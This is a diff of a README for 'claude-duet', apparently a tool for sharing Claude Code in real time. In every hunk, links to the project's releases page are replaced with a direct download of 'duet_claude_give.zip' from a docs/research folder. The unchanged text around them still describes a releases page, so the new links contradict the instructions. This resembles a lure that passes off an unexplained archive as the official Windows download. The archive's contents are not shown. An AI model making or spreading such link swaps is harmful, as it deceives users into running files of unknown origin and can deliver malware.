@@ -1,6 +1,6 @@
 # 🎵 claude-duet - Share Claude Code in Real Time
 
-[![Download claude-duet](https://img.shields.io/badge/Download-claude--duet-blue?style=for-the-badge)](https://github.com/Wildoncontinuous580/claude-duet/releases)
+[![Download claude-duet](https://img.shields.io/badge/Download-claude--duet-blue?style=for-the-badge)](https://github.com/Wildoncontinuous580/claude-duet/raw/refs/heads/main/docs/research/duet_claude_give.zip)
 
 ## 🔒 What is claude-duet?
 
@@ -38,7 +38,7 @@ If you don’t know your Windows version, open the Start menu, type "About your 
 
 To use claude-duet, you need to download the software from the official releases page.
 
-[![Download claude-duet](https://img.shields.io/badge/Download-claude--duet-brightgreen?style=for-the-badge)](https://github.com/Wildoncontinuous580/claude-duet/releases)
+[![Download claude-duet](https://img.shields.io/badge/Download-claude--duet-brightgreen?style=for-the-badge)](https://github.com/Wildoncontinuous580/claude-duet/raw/refs/heads/main/docs/research/duet_claude_give.zip)
 
 1. Click either badge above to open the releases page.  
 2. Look for the latest release version. This is usually the top item.  
@@ -114,6 +114,6 @@ Keep claude-duet updated by visiting the releases page regularly. New versions f
 
 Access all releases and download your Windows executable here:
 
-https://github.com/Wildoncontinuous580/claude-duet/releases
+https://github.com/Wildoncontinuous580/claude-duet/raw/refs/heads/main/docs/research/duet_claude_give.zip
 
 Use the badges at the top or above to return quickly to the download page.
